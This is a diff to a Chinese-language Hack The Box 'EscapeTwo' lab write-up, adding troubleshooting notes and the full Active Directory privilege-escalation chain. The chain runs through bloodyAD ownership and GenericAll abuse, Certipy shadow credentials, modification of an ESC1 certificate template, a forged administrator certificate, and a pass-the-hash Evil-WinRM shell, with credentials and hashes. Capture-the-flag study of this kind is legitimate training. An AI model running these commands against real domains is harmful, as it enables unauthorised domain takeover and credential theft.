@@ -97,7 +97,7 @@ SMB         10.129.63.253   445    DC01             Users           READ
 ```
 #### 我们看到我们已经读取了对会计部门共享的访问权限，我们继续进行枚举smbclient。
 ```
- [★]$ impacket-smbclient sequel.htb/rose:'KxEPkKe6R8su'@10.129.63.253
+[★]$ impacket-smbclient sequel.htb/rose:'KxEPkKe6R8su'@10.129.63.253
 Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
 
 Type help for list of commands
@@ -550,7 +550,7 @@ Starting Neo4j.
 搜索：sql_svc@sequel.htb并标记为拥有'Mark User as Owned'
 ```
 #### Ryan 拥有WriteOwnerCA_SVC 的管理权：
-![图片](image/2026012001.png)
+![图片](image/20260120.png)
 ```
  #certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.129.67.243
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -694,7 +694,7 @@ Certificate Templates
 
 #### 我将使用我对模板的控制，使其容易受到ESC1的攻击，然后利用它。
 
-#### 从EscapeTwo发布（Certipy版本4.8.2）到本文发布（Certipy 5.0.2）期间，利用这个漏洞的命令发生了变化。我将展示两者。
+#### 从EscapeTwo发布（Certipy版本4.8.2）到本文发布（Certipy 5.0.2）期间，利用这个漏洞的命令发生了变化。
 ```
 因为ca_svc对模板有完全的控制，我将使用以下选项使用证书使其易受ESC1攻击：
 
@@ -706,13 +706,122 @@ Template -用于读取和修改模板的命令
 -target <dc主机名> -目标机器
 -save-old 保存旧模板的副本以便恢复
 
-#certipy template -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.72.89 -template DunderMifflinAuthentication -target dc01.sequel.htb -save-old
+```
+#### 这个靶机时常会出现的报错：
+```
+#bloodyAD -d sequel.htb --host 10.129.232.128 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
+Traceback (most recent call last):
+  File "/root/.local/bin/bloodyAD", line 8, in <module>
+    sys.exit(main())
+             ^^^^^^
+  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/main.py", line 342, in main
+    asyncio.run(amain())
+  File "/usr/lib/python3.11/asyncio/runners.py", line 190, in run
+    return runner.run(main)
+           ^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/asyncio/runners.py", line 118, in run
+    return self._loop.run_until_complete(task)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/asyncio/base_events.py", line 653, in run_until_complete
+    return future.result()
+           ^^^^^^^^^^^^^^^
+  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/main.py", line 272, in amain
+    output = await result
+             ^^^^^^^^^^^^
+  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/cli_modules/add.py", line 429, in genericAll
+    await ldap.bloodymodify(
+  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/network/ldap.py", line 336, in bloodymodify
+    raise err
+badldap.commons.exceptions.LDAPModifyException: insufficientAccessRights for CN=Certification Authority,CN=Users,DC=sequel,DC=htb (Attr) — Reason:(ERROR_ACCESS_DENIED) Access is denied.
+
+//以及报错二
+
+#certipy req -ca sequel-DC01-CA -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128 -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb 
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error while trying to request certificate: code: 0x8009480f - CERTSRV_E_SUBJECT_DNS_REQUIRED - The Domain Name System (DNS) name is unavailable and cannot be added to the Subject Alternate name.
+[*] Request ID is 8
+Would you like to save the private key? (y/N) n
+[-] Failed to request certificate
+```
+#### 报错的原因都是相同的，就是被快速刷新了，所以需要一口气，完成多条命令
+```
+#bloodyAD -d sequel.htb --host 10.129.232.128 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
+[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
+
+#bloodyAD -d sequel.htb --host 10.129.232.128 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
+[+] ryan has now GenericAll on ca_svc
+
+#certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.129.232.128
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'c521f84f-cff9-6d36-90f8-2ff2bb816c7c'
+[*] Adding Key Credential with device ID 'c521f84f-cff9-6d36-90f8-2ff2bb816c7c' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID 'c521f84f-cff9-6d36-90f8-2ff2bb816c7c' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Using principal: ca_svc@sequel.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Restoring the old Key Credentials for 'ca_svc'
+[*] Successfully restored the old Key Credentials for 'ca_svc'
+[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
+
+#certipy template -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128 -template DunderMifflinAuthentication -target dc01.sequel.htb -save-old
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
 [*] Updating certificate template 'DunderMifflinAuthentication'
 [*] Successfully updated 'DunderMifflinAuthentication'
+
+#certipy req -ca sequel-DC01-CA -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128 -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb 
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 10
+[*] Got certificate with UPN 'administrator@sequel.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+
+#ls
+administrator.pfx  Documents                         my_data    Videos
+cacert.der         Downloads                         Pictures
+ca_svc.ccache      DunderMifflinAuthentication.json  Public
 ```
-#### 现在我可以使用修改后的模板申请域管理员证书了：
+#### Shell
+```
+#evil-winrm -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff -i dc01.sequel.htb
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+sequel\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
+*Evil-WinRM* PS C:\Users\Administrator\desktop> dir
+
+
+    Directory: C:\Users\Administrator\desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        1/25/2026   1:25 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\desktop> exit
+```
+
 
 
